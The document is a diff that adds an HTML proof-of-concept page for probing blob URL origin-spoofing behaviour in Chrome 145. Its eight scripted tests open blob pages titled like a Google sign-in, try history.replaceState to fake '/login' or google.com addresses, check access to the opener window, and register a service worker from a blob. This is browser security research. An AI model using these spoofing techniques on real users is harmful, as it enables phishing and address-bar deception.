@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: Blob URL Spoofing — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; }
+  .result { color: #70a1ff; margin-top: 8px; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+</style>
+</head>
+<body>
+<h1>PoC: Blob URL Origin Spoofing</h1>
+<p class="warn">Target: Chrome 145 on Linux | Tests blob: URL origin display and navigation confusion</p>
+<p class="warn">Related: CVE-2023-2312, CVE-2022-3889 (blob URL origin issues)</p>
+
+<h2>Test 1: Blob URL with spoofed origin display</h2>
+<div class="test-case">
+  <p>Creates a blob URL whose content mimics a legitimate site. Tests if the blob: origin in the address bar is misleading.</p>
+  <button onclick="test1()">Run Test</button>
+  <pre id="t1-result"></pre>
+</div>
+
+<h2>Test 2: Blob URL navigation then history manipulation</h2>
+<div class="test-case">
+  <p>Opens blob URL, then uses history.replaceState to change displayed URL.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2-result"></pre>
+</div>
+
+<h2>Test 3: Blob URL with meta-refresh redirect</h2>
+<div class="test-case">
+  <p>Creates blob URL with meta-refresh that redirects. Tests if URL bar updates correctly during transition.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3-result"></pre>
+</div>
+
+<h2>Test 4: Revoking blob URL during navigation</h2>
+<div class="test-case">
+  <p>Creates blob URL, starts navigation, then revokes it mid-flight. Tests error state display.</p>
+  <button onclick="test4()">Run Test</button>
+  <pre id="t4-result"></pre>
+</div>
+
+<h2>Test 5: Blob URL iframe with srcdoc fallback</h2>
+<div class="test-case">
+  <p>Tests blob URL in iframe with srcdoc, checking origin inheritance chains.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5-result"></pre>
+  <iframe id="t5-frame" style="width:100%;height:150px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 6: Nested blob URLs (blob within blob)</h2>
+<div class="test-case">
+  <p>Creates a blob URL that itself creates another blob URL. Tests origin chain and address bar behavior.</p>
+  <button onclick="test6()">Run Test</button>
+  <pre id="t6-result"></pre>
+</div>
+
+<h2>Test 7: Blob URL + window.open + opener access</h2>
+<div class="test-case">
+  <p>Tests if blob URL opened via window.open retains opener reference and can manipulate opener's location.</p>
+  <button onclick="test7()">Run Test</button>
+  <pre id="t7-result"></pre>
+</div>
+
+<h2>Test 8: Blob URL with Service Worker interception</h2>
+<div class="test-case">
+  <p>Tests if a Service Worker can intercept navigation to a blob URL and serve different content.</p>
+  <button onclick="test8()">Run Test</button>
+  <pre id="t8-result"></pre>
+</div>
+
+<h2>Automated Analysis</h2>
+<div class="test-case">
+  <button onclick="runAll()">Run All Passive Checks</button>
+  <pre id="all-results">Click to run...</pre>
+</div>
+
+<script>
+function log(id, msg) {
+  document.getElementById(id).textContent += msg + '\n';
+}
+
+// Test 1: Blob with spoofed content
+function test1() {
+  const html = `<!DOCTYPE html>
+<html><head><title>Google - Sign In</title></head>
+<body style="font-family:Arial;text-align:center;padding:50px;">
+<h1>This page is loaded from a blob: URL</h1>
+<p>Check the address bar — it should show blob:// with the opener's origin.</p>
+<p>Origin: <script>document.write(location.origin)<\/script></p>
+<p>URL: <script>document.write(location.href)<\/script></p>
+<p>If this were on a malicious site, the blob: origin would show the attacker's domain,
+but the page content could mimic any website.</p>
+<p style="color:red;font-weight:bold;">
+The key question: Does Chrome adequately warn users that this is a blob: URL?
+Is the origin display prominent enough?</p>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  log('t1-result', `Created blob URL: ${url}`);
+  log('t1-result', `Origin embedded: ${location.origin}`);
+  const w = window.open(url, '_blank');
+  log('t1-result', 'Opened in new tab. Inspect address bar — does it clearly show blob: prefix?');
+}
+
+// Test 2: Blob + history.replaceState
+function test2() {
+  const html = `<!DOCTYPE html>
+<html><body>
+<h2>Blob URL + history.replaceState Test</h2>
+<pre id="log"></pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += 'Initial URL: ' + location.href + '\\n';
+  l.textContent += 'Initial origin: ' + location.origin + '\\n';
+  
+  // Attempt replaceState with a different path
+  try {
+    history.replaceState({}, '', '/login');
+    l.textContent += 'replaceState("/login") succeeded!\\n';
+    l.textContent += 'New URL: ' + location.href + '\\n';
+    l.textContent += 'FINDING: URL bar may now show a path that looks like a login page\\n';
+  } catch(e) {
+    l.textContent += 'replaceState("/login") blocked: ' + e.message + '\\n';
+  }
+
+  // Try cross-origin replaceState
+  try {
+    history.replaceState({}, '', 'https://google.com/');
+    l.textContent += 'replaceState("https://google.com/") succeeded! CRITICAL FINDING\\n';
+  } catch(e) {
+    l.textContent += 'replaceState cross-origin blocked: ' + e.message + '\\n';
+  }
+
+  // Try with blob: prefix manipulation
+  try {
+    history.replaceState({}, '', 'blob:https://google.com/fake-uuid');
+    l.textContent += 'replaceState("blob:https://google.com/...") succeeded!\\n';
+    l.textContent += 'New URL: ' + location.href + '\\n';
+  } catch(e) {
+    l.textContent += 'replaceState blob:google blocked: ' + e.message + '\\n';
+  }
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  log('t2-result', `Blob URL: ${url}`);
+  window.open(url, '_blank');
+  log('t2-result', 'Opened. Check if replaceState can alter blob URL display.');
+}
+
+// Test 3: Blob with meta-refresh
+function test3() {
+  // Create blob that meta-refreshes to about:blank, then check URL bar state
+  const html = `<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="2;url=about:blank">
+</head>
+<body>
+<h2>Blob URL Meta-Refresh Test</h2>
+<p>This blob URL will meta-refresh to about:blank in 2 seconds.</p>
+<p>Watch the URL bar during transition.</p>
+<pre id="log"></pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += 'Current URL: ' + location.href + '\\n';
+  l.textContent += 'Waiting for meta-refresh...\\n';
+  
+  // Log at intervals
+  let count = 0;
+  const iv = setInterval(() => {
+    count++;
+    l.textContent += count + 's: URL=' + location.href + ' origin=' + location.origin + '\\n';
+    if (count > 5) clearInterval(iv);
+  }, 1000);
+  
+  window.addEventListener('beforeunload', () => {
+    console.log('Navigating away from blob URL. URL bar state at transition:', location.href);
+  });
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  log('t3-result', `Blob URL: ${url}`);
+  window.open(url, '_blank');
+  log('t3-result', 'Opened. Watch URL bar during meta-refresh transition.');
+}
+
+// Test 4: Revoke during navigation
+function test4() {
+  const html = `<!DOCTYPE html><html><body><h2>Blob loaded successfully</h2>
+<p>URL: <script>document.write(location.href)<\/script></p></body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  log('t4-result', `Created: ${url}`);
+
+  // Open and immediately revoke
+  const w = window.open(url);
+  log('t4-result', 'Opened window...');
+
+  // Revoke at different timings
+  setTimeout(() => {
+    URL.revokeObjectURL(url);
+    log('t4-result', 'Revoked blob URL after 10ms. Check if page still loaded and what URL bar shows.');
+  }, 10);
+
+  // Also test: revoke before opening
+  const blob2 = new Blob([html], { type: 'text/html' });
+  const url2 = URL.createObjectURL(blob2);
+  URL.revokeObjectURL(url2);
+  log('t4-result', `Pre-revoked URL: ${url2}`);
+  try {
+    const w2 = window.open(url2);
+    log('t4-result', 'Opened pre-revoked URL — check result in new tab.');
+  } catch (e) {
+    log('t4-result', 'Failed to open pre-revoked URL: ' + e.message);
+  }
+}
+
+// Test 5: Blob in iframe + srcdoc
+function test5() {
+  const frame = document.getElementById('t5-frame');
+  frame.style.display = 'block';
+
+  const html = `<!DOCTYPE html><html><body>
+<h3>Blob iframe content</h3>
+<p>My origin: <script>document.write(location.origin)<\/script></p>
+<p>My URL: <script>document.write(location.href)<\/script></p>
+<p>Parent origin: <script>
+try { document.write(parent.location.origin); }
+catch(e) { document.write('blocked: '+e.message); }
+<\/script></p>
+<script>
+// Try to access parent
+try {
+  parent.postMessage({type:'blob-iframe', origin: location.origin, url: location.href}, '*');
+} catch(e) {}
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  frame.src = url;
+  log('t5-result', `Iframe blob URL: ${url}`);
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'blob-iframe') {
+      log('t5-result', `Iframe reports — origin: ${e.data.origin}, url: ${e.data.url}`);
+    }
+  });
+}
+
+// Test 6: Nested blobs
+function test6() {
+  const innerScript = `
+    const innerHtml = '<h3>Inner blob</h3><p>Origin: '+location.origin+'</p><p>URL: '+location.href+'</p>';
+    const innerBlob = new Blob([innerHtml], {type:'text/html'});
+    const innerUrl = URL.createObjectURL(innerBlob);
+    document.getElementById('info').textContent += '\\nInner blob URL: ' + innerUrl;
+    document.getElementById('nested').src = innerUrl;
+  `;
+
+  const html = `<!DOCTYPE html><html><body>
+<h2>Outer Blob (Nested Blob Test)</h2>
+<pre id="info">Outer URL: </pre>
+<iframe id="nested" style="width:100%;height:100px;border:1px solid red;"></iframe>
+<script>
+  document.getElementById('info').textContent += location.href;
+  document.getElementById('info').textContent += '\\nOuter origin: ' + location.origin;
+  ${innerScript}
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  window.open(url, '_blank');
+  log('t6-result', `Outer blob: ${url}`);
+  log('t6-result', 'Opened. Check nested blob origin chain.');
+}
+
+// Test 7: Blob + opener manipulation
+function test7() {
+  const html = `<!DOCTYPE html><html><body>
+<h2>Blob URL — Opener Access Test</h2>
+<pre id="log"></pre>
+<script>
+  const l = document.getElementById('log');
+  l.textContent += 'My URL: ' + location.href + '\\n';
+  l.textContent += 'My origin: ' + location.origin + '\\n';
+  
+  // Check opener
+  if (window.opener) {
+    l.textContent += 'Has opener: YES\\n';
+    try {
+      l.textContent += 'Opener origin: ' + window.opener.location.origin + '\\n';
+      l.textContent += 'FINDING: Can read opener origin from blob URL\\n';
+    } catch(e) {
+      l.textContent += 'Cannot read opener origin: ' + e.message + '\\n';
+    }
+    
+    // Try to navigate opener
+    try {
+      // Don't actually navigate, just check if we could
+      l.textContent += 'opener.location writable: ' + (typeof window.opener.location) + '\\n';
+      l.textContent += 'Note: blob URL with same origin CAN navigate opener\\n';
+    } catch(e) {
+      l.textContent += 'Cannot access opener.location: ' + e.message + '\\n';
+    }
+  } else {
+    l.textContent += 'No opener (noopener was set)\\n';
+  }
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  // Intentionally NOT using noopener
+  const w = window.open(url);
+  log('t7-result', `Opened blob URL without noopener: ${url}`);
+  log('t7-result', 'Check if blob page can access/navigate opener.');
+}
+
+// Test 8: Service Worker + blob
+function test8() {
+  log('t8-result', 'Attempting to register SW that intercepts blob URLs...');
+  if ('serviceWorker' in navigator) {
+    // We can't actually register a SW for blob: scheme, but let's test
+    const swCode = `
+      self.addEventListener('fetch', (e) => {
+        if (e.request.url.startsWith('blob:')) {
+          e.respondWith(new Response('<h1>Intercepted!</h1>', {headers:{'content-type':'text/html'}}));
+        }
+      });
+    `;
+    const swBlob = new Blob([swCode], { type: 'application/javascript' });
+    const swUrl = URL.createObjectURL(swBlob);
+
+    navigator.serviceWorker.register(swUrl)
+      .then(() => log('t8-result', 'SW registered from blob URL! Check scope.'))
+      .catch(e => log('t8-result', 'SW registration from blob failed (expected): ' + e.message));
+
+    // Also test: can existing SW intercept blob: navigations?
+    navigator.serviceWorker.getRegistrations().then(regs => {
+      log('t8-result', `Active SW registrations: ${regs.length}`);
+      regs.forEach(r => log('t8-result', `  scope: ${r.scope}`));
+    });
+  } else {
+    log('t8-result', 'Service Workers not available.');
+  }
+}
+
+// Passive analysis
+function runAll() {
+  const r = [];
+  r.push('=== Blob URL Security Analysis ===');
+  r.push('Date: ' + new Date().toISOString());
+  r.push('UA: ' + navigator.userAgent);
+  r.push('');
+
+  // Test URL.createObjectURL behavior
+  r.push('[1] Blob URL format analysis:');
+  const testBlob = new Blob(['test'], { type: 'text/plain' });
+  const testUrl = URL.createObjectURL(testBlob);
+  r.push(`  Created: ${testUrl}`);
+  r.push(`  Origin in URL: ${testUrl.replace('blob:', '').split('/')[0]}//${testUrl.replace('blob:', '').split('/')[2]}`);
+  r.push(`  Page origin: ${location.origin}`);
+  r.push(`  Match: ${testUrl.includes(location.origin)}`);
+  URL.revokeObjectURL(testUrl);
+
+  // Test blob URL parsing
+  r.push('');
+  r.push('[2] URL constructor with blob: URLs:');
+  try {
+    const parsed = new URL(testUrl);
+    r.push(`  protocol: ${parsed.protocol}`);
+    r.push(`  origin: ${parsed.origin}`);
+    r.push(`  pathname: ${parsed.pathname}`);
+  } catch (e) {
+    r.push(`  Parse error: ${e.message}`);
+  }
+
+  // Test cross-origin blob
+  r.push('');
+  r.push('[3] Crafted blob URL with foreign origin:');
+  const foreignBlob = 'blob:https://google.com/12345678-1234-1234-1234-123456789abc';
+  try {
+    const parsed = new URL(foreignBlob);
+    r.push(`  Parsed origin: ${parsed.origin}`);
+    r.push(`  Can navigate to foreign blob: testing...`);
+  } catch (e) {
+    r.push(`  Parse error: ${e.message}`);
+  }
+
+  // Blob size limits
+  r.push('');
+  r.push('[4] Large blob URL test:');
+  const largeBuf = new ArrayBuffer(1024 * 1024); // 1MB
+  const largeBlob = new Blob([largeBuf]);
+  const largeUrl = URL.createObjectURL(largeBlob);
+  r.push(`  1MB blob URL length: ${largeUrl.length}`);
+  URL.revokeObjectURL(largeUrl);
+
+  r.push('');
+  r.push('=== End ===');
+  document.getElementById('all-results').textContent = r.join('\n');
+}
+</script>
+</body>
+</html>
